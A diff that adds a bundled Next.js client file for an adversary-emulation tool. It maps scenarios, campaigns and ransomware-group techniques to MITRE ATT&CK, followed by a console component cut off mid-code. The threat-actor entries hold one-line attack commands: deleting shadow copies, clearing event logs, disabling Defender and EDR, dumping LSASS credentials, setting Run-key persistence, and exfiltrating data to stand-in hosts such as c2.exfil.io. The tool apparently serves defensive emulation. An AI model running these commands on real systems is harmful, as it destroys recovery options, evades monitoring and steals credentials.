@@ -1,0 +1,1151 @@
+(globalThis.TURBOPACK || (globalThis.TURBOPACK = [])).push([typeof document === "object" ? document.currentScript : undefined,
+"[project]/src/lib/types.ts [app-client] (ecmascript)", ((__turbopack_context__) => {
+"use strict";
+
+__turbopack_context__.s([
+    "CAMPAIGNS",
+    ()=>CAMPAIGNS,
+    "SCENARIOS",
+    ()=>SCENARIOS,
+    "THREAT_ACTORS",
+    ()=>THREAT_ACTORS
+]);
+const SCENARIOS = [
+    {
+        id: 'recon-local',
+        name: 'Host Reconnaissance (PowerShell)',
+        adversary: 'Red Team Ops',
+        description: 'Enumerates local network connections and running processes to identify key assets.',
+        mitreTechniques: [
+            {
+                id: 'T1049',
+                name: 'System Network Connections Discovery',
+                url: 'https://attack.mitre.org/techniques/T1049/'
+            },
+            {
+                id: 'T1057',
+                name: 'Process Discovery',
+                url: 'https://attack.mitre.org/techniques/T1057/'
+            }
+        ],
+        scriptPath: 'scenarios/recon_local.ps1',
+        estimatedDuration: '2 mins',
+        difficulty: 'Easy'
+    },
+    {
+        id: 'priv-esc',
+        name: 'Privilege Escalation Check',
+        adversary: 'APT28',
+        description: 'Checks current privileges and simulates enabling SeDebugPrivilege.',
+        mitreTechniques: [
+            {
+                id: 'T1134',
+                name: 'Access Token Manipulation',
+                url: 'https://attack.mitre.org/techniques/T1134/'
+            }
+        ],
+        scriptPath: 'scenarios/priv_esc.ps1',
+        estimatedDuration: '1 min',
+        difficulty: 'Medium'
+    },
+    {
+        id: 'lateral-dc',
+        name: 'Lateral Movement to Domain Controller',
+        adversary: 'APT28',
+        description: 'Attempts to verify connectivity and simulate administrative share access to the DC (10.160.37.16).',
+        mitreTechniques: [
+            {
+                id: 'T1021.002',
+                name: 'Remote Services: SMB',
+                url: 'https://attack.mitre.org/techniques/T1021/002/'
+            }
+        ],
+        scriptPath: 'scenarios/lateral_dc.ps1',
+        estimatedDuration: '5 mins',
+        difficulty: 'Hard'
+    },
+    {
+        id: 'c2-check',
+        name: 'C2 Connectivity Check',
+        adversary: 'Scattered Spider',
+        description: 'Verifies DNS resolution and TCP connectivity to the configured C2 infrastructure.',
+        mitreTechniques: [
+            {
+                id: 'T1071',
+                name: 'Application Layer Protocol',
+                url: 'https://attack.mitre.org/techniques/T1071/'
+            }
+        ],
+        scriptPath: 'scenarios/c2_check.ps1',
+        estimatedDuration: '2 mins',
+        difficulty: 'Easy'
+    },
+    {
+        id: 'persistence-reg',
+        name: 'Persistence (Registry)',
+        adversary: 'APT1',
+        description: 'Creates a simulated malicious Run key in HKCU.',
+        mitreTechniques: [
+            {
+                id: 'T1547.001',
+                name: 'Registry Run Keys',
+                url: 'https://attack.mitre.org/techniques/T1547/001/'
+            }
+        ],
+        scriptPath: 'scenarios/persistence.ps1',
+        estimatedDuration: '1 min',
+        difficulty: 'Medium'
+    },
+    {
+        id: 'defense-evasion',
+        name: 'Defense Evasion (Clear Logs)',
+        adversary: 'Red Team Ops',
+        description: 'Simulates clearing the Security Event Log.',
+        mitreTechniques: [
+            {
+                id: 'T1070.001',
+                name: 'Indicator Removal: Clear Windows Event Logs',
+                url: 'https://attack.mitre.org/techniques/T1070/001/'
+            }
+        ],
+        scriptPath: 'scenarios/defense_evasion.ps1',
+        estimatedDuration: '2 mins',
+        difficulty: 'Medium'
+    },
+    {
+        id: 'cred-dump',
+        name: 'Credential Dumping (Active)',
+        adversary: 'APT1',
+        description: 'Simulates dumping LSASS memory using rundll32 and comsvcs.dll.',
+        mitreTechniques: [
+            {
+                id: 'T1003.001',
+                name: 'OS Credential Dumping: LSASS Memory',
+                url: 'https://attack.mitre.org/techniques/T1003/001/'
+            }
+        ],
+        scriptPath: 'scenarios/cred_dump.ps1',
+        estimatedDuration: '3 mins',
+        difficulty: 'Hard'
+    },
+    {
+        id: 'initial-access',
+        name: 'Initial Access (Payload Staging)',
+        adversary: 'APT45',
+        description: 'Simulates dropping a payload (output.wav) to C:\\temp for exfiltration.',
+        mitreTechniques: [
+            {
+                id: 'T1105',
+                name: 'Ingress Tool Transfer',
+                url: 'https://attack.mitre.org/techniques/T1105/'
+            }
+        ],
+        scriptPath: 'scenarios/initial_access.ps1',
+        estimatedDuration: '1 min',
+        difficulty: 'Easy'
+    },
+    {
+        id: 'exfil-dns',
+        name: 'Exfiltration via DNS',
+        adversary: 'APT45',
+        description: 'Reads the staged payload and exfiltrates it via DNS A record queries.',
+        mitreTechniques: [
+            {
+                id: 'T1048.003',
+                name: 'Exfiltration Over Alternative Protocol: DNS',
+                url: 'https://attack.mitre.org/techniques/T1048/003/'
+            }
+        ],
+        scriptPath: 'scenarios/exfil_dns.ps1',
+        estimatedDuration: '3 mins',
+        difficulty: 'Hard'
+    }
+];
+const CAMPAIGNS = [
+    {
+        id: 'full-killchain-campaign',
+        adversary: 'Red Team Ops',
+        name: 'Full Killchain Emulation',
+        description: 'A complete end-to-end simulation from Initial Access to Exfiltration.',
+        steps: [
+            'initial-access',
+            'persistence-reg',
+            'priv-esc',
+            'defense-evasion',
+            'lateral-dc',
+            'c2-check',
+            'exfil-dns'
+        ]
+    },
+    {
+        id: 'apt28-campaign',
+        adversary: 'APT28',
+        name: 'Operation XAgent',
+        description: 'Simulates a typical APT28 intrusion chain involving recon, privilege escalation, and lateral movement targeting high-value infrastructure.',
+        steps: [
+            'recon-local',
+            'priv-esc',
+            'lateral-dc',
+            'cred-dump'
+        ] // Example chain
+    },
+    {
+        id: 'apt1-campaign',
+        adversary: 'APT1',
+        name: 'Operation Comment Crew',
+        description: 'A noise-heavy campaign focusing on persistence and credential harvesting.',
+        steps: [
+            'recon-local',
+            'persistence-reg',
+            'cred-dump'
+        ]
+    },
+    {
+        id: 'scattered-spider-campaign',
+        adversary: 'Scattered Spider',
+        name: 'Cloud & Identity Siege',
+        description: 'Focuses on connecting to C2, evading defenses, and establishing persistence for long-term access.',
+        steps: [
+            'c2-check',
+            'defense-evasion',
+            'persistence-reg',
+            'priv-esc'
+        ]
+    },
+    {
+        id: 'apt45-campaign',
+        adversary: 'APT45',
+        name: 'North Korean Info Stealer',
+        description: 'Rapid collection of information and credentials.',
+        steps: [
+            'recon-local',
+            'defense-evasion',
+            'cred-dump'
+        ]
+    },
+    {
+        id: 'mustang-panda-campaign',
+        adversary: 'Mustang Panda',
+        name: 'PlugX Propagation',
+        description: 'Lateral movement and C2 beaconing focus.',
+        steps: [
+            'recon-local',
+            'lateral-dc',
+            'c2-check'
+        ]
+    },
+    {
+        id: 'wizard-spider-campaign',
+        adversary: 'Wizard Spider',
+        name: 'Conti/Ryuk Precursor',
+        description: 'The prelude to a ransomware attack: Recon, C2 verification, and spreading via SMB.',
+        steps: [
+            'recon-local',
+            'c2-check',
+            'lateral-dc',
+            'defense-evasion'
+        ]
+    }
+];
+const THREAT_ACTORS = [
+    {
+        id: 'lockbit',
+        name: 'LockBit 3.0',
+        aliases: [
+            'LockBit Black'
+        ],
+        description: 'One of the most prolific RaaS groups. LockBit 3.0 uses a modular ransomware payload and extensive living-off-the-land techniques.',
+        ttps: [
+            {
+                id: 'T1047',
+                technique: 'Windows Management Instrumentation',
+                tactic: 'Execution',
+                description: 'Uses WMI to delete Volume Shadow Copies to prevent recovery.',
+                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }',
+                scriptPath: 'scenarios/lockbit/wmi_shadowcopy.ps1'
+            },
+            {
+                id: 'T1070.001',
+                technique: 'Indicator Removal: Clear Windows Event Logs',
+                tactic: 'Defense Evasion',
+                description: 'Clears security, system, and application logs to hide activity.',
+                commandSnippet: 'wevtutil cl Security; wevtutil cl System; wevtutil cl Application',
+                scriptPath: 'scenarios/lockbit/log_clear.ps1'
+            },
+            {
+                id: 'T1112',
+                technique: 'Modify Registry',
+                tactic: 'Defense Evasion',
+                description: 'Modifies registry to disable Windows Defender defenses.',
+                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
+                scriptPath: 'scenarios/lockbit/disable_defender.ps1',
+                revertScriptPath: 'scenarios/lockbit/disable_defender_revert.ps1'
+            },
+            {
+                id: 'T1490',
+                technique: 'Inhibit System Recovery',
+                tactic: 'Impact',
+                description: 'Disables boot recovery options using bcdedit.',
+                commandSnippet: 'bcdedit /set {default} recoveryenabled No',
+                scriptPath: 'scenarios/lockbit/bcdedit_recovery.ps1',
+                revertScriptPath: 'scenarios/lockbit/bcdedit_recovery_revert.ps1'
+            }
+        ]
+    },
+    {
+        id: 'generic-discovery',
+        name: 'Generic Discovery Modules',
+        aliases: [
+            'Red Team Ops',
+            'Manual Recon'
+        ],
+        description: 'Common discovery commands used by various threat actors to enumerate the environment.',
+        ttps: [
+            {
+                id: 'T1016',
+                technique: 'System Network Configuration Discovery',
+                tactic: 'Discovery',
+                description: 'Enumerates network interfaces and IP configurations.',
+                commandSnippet: 'ipconfig /all',
+                scriptPath: 'scenarios/library/discovery_network.ps1'
+            },
+            {
+                id: 'T1069',
+                technique: 'Permission Groups Discovery',
+                tactic: 'Discovery',
+                description: 'Enumerates domain groups and members.',
+                commandSnippet: 'net group /domain "Domain Admins"',
+                scriptPath: 'scenarios/library/discovery_groups.ps1'
+            },
+            {
+                id: 'T1033',
+                technique: 'System Owner/User Discovery',
+                tactic: 'Discovery',
+                description: 'Identifies the current user context.',
+                commandSnippet: 'whoami /all',
+                scriptPath: 'scenarios/library/discovery_user.ps1'
+            },
+            {
+                id: 'T1087',
+                technique: 'Account Discovery',
+                tactic: 'Discovery',
+                description: 'Enumerates all users in the domain.',
+                commandSnippet: 'Get-ADUser -Filter * | Select-Object Name,SamAccountName',
+                scriptPath: 'scenarios/library/discovery_ad_users.ps1'
+            }
+        ]
+    },
+    {
+        id: 'blackbasta',
+        name: 'Black Basta',
+        aliases: [
+            'Black Basta Syndicate'
+        ],
+        description: 'Emerged in 2022 as a potent RaaS. Known for spearphishing, Qakbot distribution, and using Backstab to disable EDR.',
+        ttps: [
+            {
+                id: 'T1566',
+                technique: 'Phishing',
+                tactic: 'Initial Access',
+                description: 'Uses spearphishing emails with malicious ZIP attachments.',
+                commandSnippet: '# Simulated phishing delivery',
+                scriptPath: 'scenarios/blackbasta/phishing_sim.ps1'
+            },
+            {
+                id: 'T1562.001',
+                technique: 'Impair Defenses: Disable or Modify Tools',
+                tactic: 'Defense Evasion',
+                description: 'Uses Backstab tool to disable EDR products.',
+                commandSnippet: 'Stop-Service -Name "Sense" -Force',
+                scriptPath: 'scenarios/blackbasta/disable_edr.ps1',
+                revertScriptPath: 'scenarios/blackbasta/disable_edr_revert.ps1'
+            },
+            {
+                id: 'T1068',
+                technique: 'Exploitation for Privilege Escalation',
+                tactic: 'Privilege Escalation',
+                description: 'Uses exploits like Zerologon, NoPac, PrintNightmare.',
+                commandSnippet: '# Invoke-ZeroLogon simulation',
+                scriptPath: 'scenarios/blackbasta/priv_esc_exploit.ps1'
+            },
+            {
+                id: 'T1021.001',
+                technique: 'Remote Services: RDP',
+                tactic: 'Lateral Movement',
+                description: 'Uses valid accounts for RDP access.',
+                commandSnippet: 'mstsc /v:<TARGET_IP>',
+                scriptPath: 'scenarios/blackbasta/rdp_lateral.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP Address',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        id: 'alphv',
+        name: 'ALPHV / BlackCat',
+        aliases: [
+            'ALPHV',
+            'BlackCat',
+            'Noberus'
+        ],
+        description: 'First major ransomware written in Rust. Highly customizable with multiple extortion methods.',
+        ttps: [
+            {
+                id: 'T1078',
+                technique: 'Valid Accounts',
+                tactic: 'Initial Access',
+                description: 'Uses ProxyShell vulnerabilities for initial access.',
+                commandSnippet: '# ProxyShell exploitation simulation',
+                scriptPath: 'scenarios/alphv/proxyshell_sim.ps1'
+            },
+            {
+                id: 'T1059.001',
+                technique: 'PowerShell',
+                tactic: 'Execution',
+                description: 'Uses PowerShell to delete shadow copies and clear logs.',
+                commandSnippet: 'Get-WmiObject Win32_Shadowcopy | Remove-WmiObject',
+                scriptPath: 'scenarios/alphv/ps_execution.ps1'
+            },
+            {
+                id: 'T1053',
+                technique: 'Scheduled Task/Job',
+                tactic: 'Execution',
+                description: 'Creates scheduled tasks to deploy ransomware via GPO.',
+                commandSnippet: 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
+                scriptPath: 'scenarios/alphv/schtask_create.ps1',
+                revertScriptPath: 'scenarios/alphv/schtask_create_revert.ps1'
+            }
+        ]
+    },
+    {
+        id: 'avoslocker',
+        name: 'AvosLocker',
+        aliases: [
+            'Avos',
+            'AvosLocker RaaS'
+        ],
+        description: 'RaaS known for exploiting public-facing applications and using legitimate remote access tools.',
+        ttps: [
+            {
+                id: 'T1190',
+                technique: 'Exploit Public-Facing Application',
+                tactic: 'Initial Access',
+                description: 'Exploits vulnerable web applications for entry.',
+                commandSnippet: '# Web exploit simulation',
+                scriptPath: 'scenarios/avoslocker/webexploit_sim.ps1'
+            },
+            {
+                id: 'T1490',
+                technique: 'Inhibit System Recovery',
+                tactic: 'Impact',
+                description: 'Deletes shadow copies to prevent recovery.',
+                commandSnippet: 'vssadmin delete shadows /all /quiet',
+                scriptPath: 'scenarios/avoslocker/delete_shadows.ps1'
+            },
+            {
+                id: 'T1219',
+                technique: 'Remote Access Tools',
+                tactic: 'Command and Control',
+                description: 'Uses tools like AnyDesk or TeamViewer for persistence.',
+                commandSnippet: 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
+                scriptPath: 'scenarios/avoslocker/rat_install.ps1',
+                inputParams: [
+                    {
+                        name: 'C2URL',
+                        label: 'C2 Server URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:443/beacon',
+                        required: true
+                    }
+                ]
+            },
+            {
+                id: 'T1486',
+                technique: 'Data Encrypted for Impact',
+                tactic: 'Impact',
+                description: 'Encrypts victim data to demand ransom.',
+                commandSnippet: '# Encryption simulation (safe mode)',
+                scriptPath: 'scenarios/avoslocker/encrypt_sim.ps1'
+            }
+        ]
+    },
+    {
+        id: 'bianlian',
+        name: 'BianLian',
+        aliases: [
+            'BianLian Gang'
+        ],
+        description: 'Go-based ransomware known for sandbox evasion and spreading via removable media.',
+        ttps: [
+            {
+                id: 'T1497',
+                technique: 'Virtualization/Sandbox Evasion',
+                tactic: 'Defense Evasion',
+                description: 'Detects and avoids virtualization environments.',
+                commandSnippet: 'Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer',
+                scriptPath: 'scenarios/bianlian/vm_detect.ps1'
+            },
+            {
+                id: 'T1027.002',
+                technique: 'Software Packing',
+                tactic: 'Defense Evasion',
+                description: 'Uses software packing to conceal code.',
+                commandSnippet: '# Packed payload simulation',
+                scriptPath: 'scenarios/bianlian/packed_payload.ps1'
+            },
+            {
+                id: 'T1091',
+                technique: 'Replication Through Removable Media',
+                tactic: 'Lateral Movement',
+                description: 'Spreads via USB and autorun.',
+                commandSnippet: 'Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"',
+                scriptPath: 'scenarios/bianlian/usb_spread.ps1'
+            },
+            {
+                id: 'T1486',
+                technique: 'Data Encrypted for Impact',
+                tactic: 'Impact',
+                description: 'Encrypts data for extortion.',
+                commandSnippet: '# Encryption simulation (safe mode)',
+                scriptPath: 'scenarios/bianlian/encrypt_sim.ps1',
+                revertScriptPath: 'scenarios/bianlian/encrypt_sim_revert.ps1'
+            }
+        ]
+    },
+    {
+        id: 'clop',
+        name: 'Cl0p',
+        aliases: [
+            'Cl0p',
+            'TA505',
+            'FIN11'
+        ],
+        description: 'Notorious for exploiting zero-days (MOVEit, Accellion FTA) and large-scale data theft.',
+        ttps: [
+            {
+                id: 'T1190',
+                technique: 'Exploit Public-Facing Application',
+                tactic: 'Initial Access',
+                description: 'Exploits CVEs like MOVEit (CVE-2023-34362).',
+                commandSnippet: '# MOVEit exploit simulation',
+                scriptPath: 'scenarios/clop/moveit_exploit.ps1'
+            },
+            {
+                id: 'T1547',
+                technique: 'Boot or Logon Autostart Execution',
+                tactic: 'Persistence',
+                description: 'Creates registry run entries for persistence.',
+                commandSnippet: 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
+                scriptPath: 'scenarios/clop/registry_persist.ps1',
+                revertScriptPath: 'scenarios/clop/registry_persist_revert.ps1'
+            },
+            {
+                id: 'T1070.001',
+                technique: 'Clear Windows Event Logs',
+                tactic: 'Defense Evasion',
+                description: 'Clears event logs to hide activity.',
+                commandSnippet: 'wevtutil cl Security; wevtutil cl System',
+                scriptPath: 'scenarios/clop/log_clear.ps1'
+            },
+            {
+                id: 'T1567',
+                technique: 'Exfiltration Over Web Service',
+                tactic: 'Exfiltration',
+                description: 'Exfiltrates data via DEWMODE webshell.',
+                commandSnippet: '# Webshell exfil simulation',
+                scriptPath: 'scenarios/clop/webshell_exfil.ps1'
+            }
+        ]
+    },
+    {
+        id: 'conti',
+        name: 'Conti',
+        aliases: [
+            'Conti Team',
+            'Wizard Spider'
+        ],
+        description: 'Major RaaS operation until 2022. Known for fast encryption and double extortion.',
+        ttps: [
+            {
+                id: 'T1486',
+                technique: 'Data Encrypted for Impact',
+                tactic: 'Impact',
+                description: 'Fast, multi-threaded file encryption.',
+                commandSnippet: '# Fast encryption simulation',
+                scriptPath: 'scenarios/conti/encrypt_sim.ps1'
+            },
+            {
+                id: 'T1567',
+                technique: 'Exfiltration Over Web Service',
+                tactic: 'Exfiltration',
+                description: 'Exfiltrates data before encryption for double extortion.',
+                commandSnippet: 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
+                scriptPath: 'scenarios/conti/exfil_web.ps1',
+                inputParams: [
+                    {
+                        name: 'ExfilURL',
+                        label: 'Exfiltration URL',
+                        type: 'url',
+                        placeholder: 'http://10.0.0.1:8080/upload',
+                        required: true
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        id: 'dragonforce',
+        name: 'DragonForce',
+        aliases: [
+            'DragonForce Malaysia'
+        ],
+        description: 'Hacktivist-turned-ransomware group known for self-deleting payloads.',
+        ttps: [
+            {
+                id: 'T1562.001',
+                technique: 'Impair Defenses: Disable or Modify Tools',
+                tactic: 'Defense Evasion',
+                description: 'Disables Windows Defender before encryption.',
+                commandSnippet: 'Set-MpPreference -DisableRealtimeMonitoring $true',
+                scriptPath: 'scenarios/dragonforce/disable_defender.ps1',
+                revertScriptPath: 'scenarios/dragonforce/disable_defender_revert.ps1'
+            },
+            {
+                id: 'T1070.004',
+                technique: 'Indicator Removal: File Deletion',
+                tactic: 'Defense Evasion',
+                description: 'Self-deletes ransomware binary after execution.',
+                commandSnippet: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force',
+                scriptPath: 'scenarios/dragonforce/self_delete.ps1'
+            },
+            {
+                id: 'T1486',
+                technique: 'Data Encrypted for Impact',
+                tactic: 'Impact',
+                description: 'Encrypts files for ransom.',
+                commandSnippet: '# Encryption simulation',
+                scriptPath: 'scenarios/dragonforce/encrypt_sim.ps1'
+            }
+        ]
+    },
+    {
+        id: 'safepay',
+        name: 'SafePay',
+        aliases: [
+            'SafePay Ransomware'
+        ],
+        description: 'RaaS gaining access via RDP and using UAC bypass via CMSTPLUA COM object.',
+        ttps: [
+            {
+                id: 'T1133',
+                technique: 'External Remote Services',
+                tactic: 'Initial Access',
+                description: 'Gains access via exposed RDP services.',
+                commandSnippet: 'Test-NetConnection -ComputerName <TARGET> -Port 3389',
+                scriptPath: 'scenarios/safepay/rdp_scan.ps1',
+                inputParams: [
+                    {
+                        name: 'TargetIP',
+                        label: 'Target IP or Subnet',
+                        type: 'subnet',
+                        placeholder: '10.0.0.0/24',
+                        required: true
+                    }
+                ]
+            },
+            {
+                id: 'T1548.002',
+                technique: 'Abuse Elevation Control Mechanism: Bypass UAC',
+                tactic: 'Privilege Escalation',
+                description: 'Bypasses UAC using CMSTPLUA COM object.',
+                commandSnippet: '# UAC bypass via CMSTPLUA simulation',
+                scriptPath: 'scenarios/safepay/uac_bypass.ps1',
+                revertScriptPath: 'scenarios/safepay/uac_bypass_revert.ps1'
+            },
+            {
+                id: 'T1003',
+                technique: 'Credential Dumping',
+                tactic: 'Credential Access',
+                description: 'Harvests credentials for lateral movement.',
+                commandSnippet: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full',
+                scriptPath: 'scenarios/safepay/cred_dump.ps1'
+            },
+            {
+                id: 'T1048',
+                technique: 'Exfiltration Over Alternative Protocol',
+                tactic: 'Exfiltration',
+                description: 'Uses FTP (FileZilla) for data exfiltration.',
+                commandSnippet: 'ftp -s:script.txt ftp.exfil.io',
+                scriptPath: 'scenarios/safepay/ftp_exfil.ps1',
+                inputParams: [
+                    {
+                        name: 'FTPServer',
+                        label: 'FTP Server IP',
+                        type: 'ip',
+                        placeholder: '10.0.0.1',
+                        required: true
+                    }
+                ]
+            }
+        ]
+    }
+];
+if (typeof globalThis.$RefreshHelpers$ === 'object' && globalThis.$RefreshHelpers !== null) {
+    __turbopack_context__.k.registerExports(__turbopack_context__.m, globalThis.$RefreshHelpers$);
+}
+}),
+"[project]/src/components/Console.module.css [app-client] (css module)", ((__turbopack_context__) => {
+
+__turbopack_context__.v({
+  "blink": "Console-module__pqP0ea__blink",
+  "content": "Console-module__pqP0ea__content",
+  "cursor": "Console-module__pqP0ea__cursor",
+  "dot": "Console-module__pqP0ea__dot",
+  "header": "Console-module__pqP0ea__header",
+  "line": "Console-module__pqP0ea__line",
+  "prompt": "Console-module__pqP0ea__prompt",
+  "terminal": "Console-module__pqP0ea__terminal",
+  "title": "Console-module__pqP0ea__title",
+});
+}),
+"[project]/src/components/Console.tsx [app-client] (ecmascript)", ((__turbopack_context__) => {
+"use strict";
+
+__turbopack_context__.s([
+    "default",
+    ()=>Console
+]);
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/jsx-dev-runtime.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/node_modules/next/dist/compiled/react/index.js [app-client] (ecmascript)");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__ = __turbopack_context__.i("[project]/src/components/Console.module.css [app-client] (css module)");
+;
+var _s = __turbopack_context__.k.signature();
+'use client';
+;
+;
+function Console({ logs, isRunning }) {
+    _s();
+    const bottomRef = (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useRef"])(null);
+    (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$index$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["useEffect"])({
+        "Console.useEffect": ()=>{
+            bottomRef.current?.scrollIntoView({
+                behavior: 'smooth'
+            });
+        }
+    }["Console.useEffect"], [
+        logs
+    ]);
+    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].terminal,
+        children: [
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].header,
+                children: [
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].dot,
+                        style: {
+                            background: '#ff5f56'
+                        }
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 21,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].dot,
+                        style: {
+                            background: '#ffbd2e'
+                        }
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 22,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].dot,
+                        style: {
+                            background: '#27c93f'
+                        }
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 23,
+                        columnNumber: 17
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].title,
+                        children: "root@kali:~/scenarios"
+                    }, void 0, false, {
+                        fileName: "[project]/src/components/Console.tsx",
+                        lineNumber: 24,
+                        columnNumber: 17
+                    }, this)
+                ]
+            }, void 0, true, {
+                fileName: "[project]/src/components/Console.tsx",
+                lineNumber: 20,
+                columnNumber: 13
+            }, this),
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].content,
+                children: [
+                    logs.map((log, i)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                            className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].line,
+                            children: [
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                    className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].prompt,
+                                    children: "$ "
+                                }, void 0, false, {
+                                    fileName: "[project]/src/components/Console.tsx",
+                                    lineNumber: 29,
+                                    columnNumber: 25
+                                }, this),
+                                log
+                            ]
+                        }, i, true, {
+                            fileName: "[project]/src/components/Console.tsx",
+                            lineNumber: 28,
+                            columnNumber: 21
+                        }, this)),
+                    isRunning && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                        className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].line,
+                        children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                            className: `${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$Console$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].cursor} mono`,
+                            children: "_"
